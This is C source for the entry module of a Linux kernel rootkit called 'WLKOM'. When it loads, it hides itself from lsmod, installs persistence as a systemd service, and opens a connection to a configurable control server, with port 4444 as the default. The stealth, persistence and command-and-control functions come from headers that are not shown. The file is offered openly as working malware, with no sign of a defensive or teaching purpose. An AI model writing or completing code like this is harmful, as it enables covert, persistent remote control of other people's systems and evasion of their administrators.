#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

#include "network.h"
#include "hide.h"
#include "persist.h"

#define WLKOM_VERSION "1.0.0"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("WLKOM Team");
MODULE_DESCRIPTION("Wild Linux Kernel Object Module");
MODULE_VERSION(WLKOM_VERSION);

static char control_ip[64] = "127.0.0.1";
static int  control_port   = 4444;

module_param_string(control_ip, control_ip, sizeof(control_ip), 0644);
MODULE_PARM_DESC(control_ip, "Control server IP address");

module_param(control_port, int, 0644);
MODULE_PARM_DESC(control_port, "Control server port");

/**
 * @brief Module entry point.
 *        Initializes hiding first (so the module disappears from lsmod),
 *        then persistence (systemd service), then the control connection thread.
 *        On any failure, already-initialized subsystems are torn down in
 *        reverse order before returning the error.
 * @return 0 on success, negative error code on failure.
 */
static int __init wlkom_init(void)
{
    int ret;

    pr_info("WLKOM: module loading...\n");
    pr_info("WLKOM: control %s:%d\n", control_ip, control_port);

    ret = hide_init();
    if (ret < 0)
    {
        pr_err("WLKOM: hide_init failed\n");
        return ret;
    }
    hide_module();

    ret = persist_init();
    if (ret < 0)
    {
        pr_err("WLKOM: persist_init failed\n");
        hide_exit();
        return ret;
    }

    ret = connect_init(control_ip, control_port);
    if (ret < 0)
    {
        pr_err("WLKOM: connect_init failed\n");
        persist_exit();
        hide_exit();
        return ret;
    }

    pr_info("WLKOM: module loaded\n");
    return 0;
}

/**
 * @brief Module exit point.
 *        Tears down subsystems in reverse init order:
 *        connection → persistence → hiding.
 */
static void __exit wlkom_exit(void)
{
    pr_info("WLKOM: unloading...\n");
    connect_exit();
    persist_exit();
    hide_exit();
    pr_info("WLKOM: unloaded\n");
}

module_init(wlkom_init);
module_exit(wlkom_exit);
